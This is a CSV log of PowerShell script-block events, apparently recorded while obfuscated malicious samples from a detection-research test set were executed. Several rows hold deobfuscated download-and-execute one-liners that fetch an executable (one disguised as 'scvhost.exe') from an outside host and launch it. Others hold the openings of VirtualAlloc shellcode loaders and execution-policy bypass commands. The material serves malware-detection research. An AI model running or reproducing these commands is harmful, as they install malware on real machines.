"TimeCreated","ScriptPath","ScriptLength","ScriptPreview"
"8/4/2026 10:51:14 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\14.ps1","2802","((""{39}{6}{37}{19}{22}{34}{27}{32}{35}{7}{25}{31}{36}{44}{40}{17}{30}{4}{14}{9}{28}{33}{21}{11}{20}{1}{23}{38}{16}{5}{29}{15}{3}{45}{46}{41}{10}{24}{43}{42}{2}{26}{18}{13}{0}{8}{12}"" -f 'eThrea','0x33"
"8/4/2026 10:51:14 PM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\14.ps1'"
"8/4/2026 10:51:03 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:51:03 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:51:03 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:51:03 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:51:03 PM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:51:03 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\13.ps1","2788"," ((""{45}{27}{34}{8}{25}{10}{1}{41}{30}{21}{35}{5}{40}{15}{20}{28}{22}{38}{13}{6}{18}{14}{24}{37}{26}{46}{36}{16}{29}{7}{42}{0}{31}{33}{23}{9}{44}{11}{32}{2}{12}{17}{43}{19}{39}{4}{3}""-f 'f,0xd5,0x97,0"
"8/4/2026 10:51:03 PM","","172","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\13.ps1'"
"8/4/2026 10:50:49 PM","","9","$global:?"
"8/4/2026 10:50:48 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:50:48 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:50:48 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:50:48 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:50:48 PM","","120","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'"
"8/4/2026 10:50:48 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\124.ps1","299"," ('(New-O'+'bject S'+'y'+'st'+'e'+'m.N'+'et.W'+'e'+'bClient).Downl'+'oa'+'dFile'+'(K'+'l'+'5https:/'+'/1fic'+'h'+'ie'+'r.'+'com/?'+'v8w3g7'+'36hjKl5,Kl5fleeb.ex'+'eKl5);S'+'tart-Process Kl5'+'fleeb.'+"
"8/4/2026 10:50:48 PM","","176","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\124.ps1'"
"8/4/2026 10:50:34 PM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/4/2026 10:50:34 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\112.ps1","525","('('+'New-O'+'bj'+'ect Syste'+'m.N'+'et.We'+'bCl'+'ient).Do'+'wnl'+'oadFile(ewO'+'ht'+'tp://93'+'.17'+'4'+'.94'+'.13'+'7/~karm'+'a'+'/sc'+'vh'+'os'+'t'+'.exeewO,du'+'e'+'Hhden'+'v:'+'A'+'PPDATA9Sh'+'s"
"8/4/2026 10:50:34 PM","","176","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\112.ps1'"
"8/4/2026 10:50:24 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:50:24 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:50:24 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:50:24 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:50:24 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:50:24 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\102.ps1","2647"," & ((gET-VaRiABLE '*Mdr*').name[3,11,2]-JoiN'') ( ('aYUc = '+'dhE[DllImport(liBkernel32.dllliB)]public static e'+'xtern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint f"
"8/4/2026 10:50:24 PM","","176","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\102.ps1'"
"8/4/2026 10:50:10 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:50:09 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:50:09 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:50:09 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:50:09 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:50:09 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\82.ps1","2702"," &((geT-variAbLE '*mdR*').naMe[3,11,2]-JOIN'')( ('bA1c = W4O[DllImport(dWDkernel32.dlldWD)]public static ext'+'ern Int'+'Ptr VirtualAlloc(IntPtr'+' lpAddress, uint dwSize, uint flA'+'llocationType,'+'"
"8/4/2026 10:50:09 PM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\82.ps1'"
"8/4/2026 10:49:20 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:49:20 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:49:20 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:49:20 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:49:19 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:49:19 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\67.ps1","2609","('Uy'+'kc = KCj[DllImport(deEkernel32.dlldeE)]public st'+'atic ex'+'te'+'rn IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint '+'fl'+'AllocationType, uint flProtect);[DllImport(deEkernel32.dllde"
"8/4/2026 10:49:19 PM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\67.ps1'"
"8/4/2026 10:49:13 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:49:12 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:49:12 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:49:12 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:49:12 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:49:12 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\66.ps1","2640",".( $veRboSEPRefErEnce.TOSTRINg()[1,3]+'x'-JOIn'') ( (('8iwc = u8e[DllImport(QtAkernel32.dllQtA)]public static extern IntPtr VirtualAlloc(IntPtr l'+'pAddress, uint dwSize, uint flAllocationType, uint f"
"8/4/2026 10:49:12 PM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\66.ps1'"
"8/4/2026 10:49:07 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:49:07 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:49:07 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:49:07 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:49:07 PM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:49:07 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\61.ps1","2801"," .( $sheLlId[1]+$ShelLiD[13]+'X') ( ('2p1c = nGW[DllImport(zxakern'+'el32.dllzxa)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImp"
"8/4/2026 10:49:07 PM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\61.ps1'"
"8/4/2026 10:49:00 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:49:00 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:49:00 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:49:00 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:49:00 PM","","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/4/2026 10:49:00 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\52.ps1","3136",". ( $PSHome[21]+$pShOmE[34]+'X')((('Yit6UhT ='+' v3H[DllImport'+'(vhCkernel32.dllvhC)]publ'+'ic static e'+'xtern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uin'+'t flPro"
"8/4/2026 10:49:00 PM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\52.ps1'"
"8/4/2026 10:48:05 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:48:05 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:48:05 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:48:05 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:48:05 PM","","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/4/2026 10:48:05 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\14.ps1","2636","(('Wmaqkc = m5d[DllImport(9oxkernel32.dll9ox)]public static extern IntPtr VirtualAlloc(I'+'n'+'tPtr lpAddress, uint dwSize, uint flA'+'llocationTyp'+'e, uint flProtect);[DllImport(9oxkernel32.'+'dll9o"
"8/4/2026 10:48:04 PM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\14.ps1'"
"8/4/2026 10:48:00 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:48:00 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:48:00 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:48:00 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:48:00 PM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:48:00 PM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\13.ps1","2678",". ( $ENV:coMSPeC[4,24,25]-joIn'')((('y7zc = YBg[DllImport(iC'+'wkernel32.dlliCw)]public static extern IntPtr'+' VirtualAll'+'oc(IntPtr lpAd'+'dress, uint dwSize, uint flAll'+'ocationType, uint flProte"
"8/4/2026 10:48:00 PM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\13.ps1'"
"8/4/2026 10:47:42 PM","","9","$global:?"
"8/4/2026 10:47:42 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:47:42 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:47:42 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:47:42 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:47:42 PM","","120","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'"
"8/4/2026 10:47:42 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\124.ps1","22","{ ([inT]$_-As[cHaR]) }"
"8/4/2026 10:47:42 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\124.ps1","657","[StRINg]::JOiN('',(( 40 , 78,101 , 119 , 45,79, 98 ,106, 101 , 99, 116, 32, 83 ,121 , 115, 116 ,101, 109, 46, 78 ,101 ,116,46 , 87,101 ,98, 67,108 ,105,101 ,110, 116, 41 , 46 , 68 , 111 ,119 , 110 , 1"
"8/4/2026 10:47:42 PM","","170","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\124.ps1'"
"8/4/2026 10:47:24 PM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/4/2026 10:47:24 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\112.ps1","770","-JOIN[ChaR[]] (40 , 78 ,101 ,119 , 45, 79 ,98 , 106 , 101,99 , 116 ,32,83,121 , 115, 116,101,109 ,46, 78,101,116 ,46,87, 101 , 98,67,108 , 105,101, 110, 116 , 41, 46 ,68 ,111, 119,110 , 108 , 111, 97 "
"8/4/2026 10:47:24 PM","","170","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\112.ps1'"
"8/4/2026 10:46:42 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:46:42 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:46:42 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:46:41 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:46:41 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\102.ps1","25","{ ( [InT] $_-aS [cHar]) }"
"8/4/2026 10:46:41 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\102.ps1","7757","""$( seT-IteM  'vARIAbLe:OfS' '')""+[sTrinG]( '36t99;32c61V32;39V91}68}108}108x73c109x112:111F114x116;40,34,107V101F114}110:101F108x51c50;46}100t108,108,34;41t93t112t117O98}108}105V99,32V115,116O97;116}"
"8/4/2026 10:46:41 PM","","170","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\102.ps1'"
"8/4/2026 10:46:36 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:46:36 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:46:36 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:46:36 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:46:35 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:46:35 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\82.ps1","20","{ ( [CHar][INt]$_) }"
"8/4/2026 10:46:35 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\82.ps1","7579"," ( '36_99J32!61!32!39Z91Z68S108u108S73u109%112-111u114-116-40u34S107-101-114!110d101f108d51d50S46J100d108%108Z34J41!93-112d117!98-108J105S99%32u115d116%97_116u105-99f32-101_120J116J101-114u110S32u73Z1"
"8/4/2026 10:46:35 PM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\82.ps1'"
"8/4/2026 10:46:30 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:46:30 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:46:30 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:46:30 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:46:29 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:46:29 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\67.ps1","19","{([CHAR] [int] $_)}"
"8/4/2026 10:46:29 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\67.ps1","7570"," -JOin ('36X99%32,61Y32-39Q91<68Q108%108Q73<109<112z111!114Y116z40%34%107Y101<114%110<101<108z51z50Q46,100!108P108Y34!41Q93<112-117X98Q108Y105z99Q32Q115!116!97!116Q105P99,32z101Y120!116z101z114Q110Y32"
"8/4/2026 10:46:29 PM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\67.ps1'"
"8/4/2026 10:46:23 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:46:22 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:46:22 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:46:22 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:46:22 PM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:46:22 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\66.ps1","9773"," . ( $env:coMsPEC[4,24,25]-jOIn'') (-JOiN[chAr[]] (36,99,32 ,61, 32, 39 , 91 , 68,108, 108 ,73, 109,112, 111, 114 , 116, 40 ,34,107 , 101 ,114 ,110,101,108, 51,50, 46, 100,108, 108 , 34, 41 , 93 , 112"
"8/4/2026 10:46:22 PM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\66.ps1'"
"8/4/2026 10:46:08 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:46:08 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:46:08 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:46:08 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:46:08 PM","","2448"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/4/2026 10:46:08 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\61.ps1","25","{ ( [inT] $_-aS [CHAR]) }"
"8/4/2026 10:46:08 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\61.ps1","10757"," .( $Env:cOmSpec[4,26,25]-JOin'')("" $(sET-VaRiAbLE  'OFS' '')"" +[sTRiNg]( (36,99,32,61, 32,39 ,91, 68, 108 ,108,73,109,112 ,111,114 ,116, 40,34 , 107, 101, 114, 110 ,101, 108 ,51 , 50 , 46, 100 , 108,"
"8/4/2026 10:46:08 PM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\61.ps1'"
"8/4/2026 10:45:53 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:45:53 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:45:53 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:45:52 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:45:52 PM","","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/4/2026 10:45:52 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\52.ps1","11855"," .( ([stRinG]$VerBOsePReFeREncE)[1,3]+'x'-JOin'') ([chaR[]] ( 36 ,54,85,104, 84 ,32,61,32 , 39, 91,68 , 108 ,108,73, 109 ,112,111 ,114 ,116 , 40,34 , 107 , 101,114,110 ,101, 108 ,51,50 ,46, 100, 108, "
"8/4/2026 10:45:52 PM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\52.ps1'"
"8/4/2026 10:45:46 PM","","2246"," $qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/4/2026 10:45:46 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\14.ps1","21","{([int]$_ -As[chAR])}"
"8/4/2026 10:45:45 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\14.ps1","7777"," "" $( SeT-IteM 'vARiAbLE:ofS'  '')"" +[StRiNg]('36g113E107P99Y32g61}32E39u91}68;108;108u73;109s112u111@114P116;40g34P107E101g114;110P101P108s51E50P46E100E108s108g34_41_93E112_117g98s108Y105P99_32g115_1"
"8/4/2026 10:45:45 PM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\14.ps1'"
"8/4/2026 10:45:34 PM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/4/2026 10:45:34 PM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/4/2026 10:45:34 PM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/4/2026 10:45:34 PM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/4/2026 10:45:34 PM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/4/2026 10:45:34 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1","19","{([CHar] [iNT] $_)}"
"8/4/2026 10:45:34 PM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1","7664","[stRIng]::joIn('' ,('36b99k32P61A32P39Z91v68&108_108b73k109P112_111b114Z116v40b34Z107v101_114I110A101F108b51v50_46Z100b108_108b34k41F93_112b117Z98A108P105_99k32Z115A116I97&116b105F99P32I101_120I116Z10"
"8/4/2026 10:45:34 PM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1'"
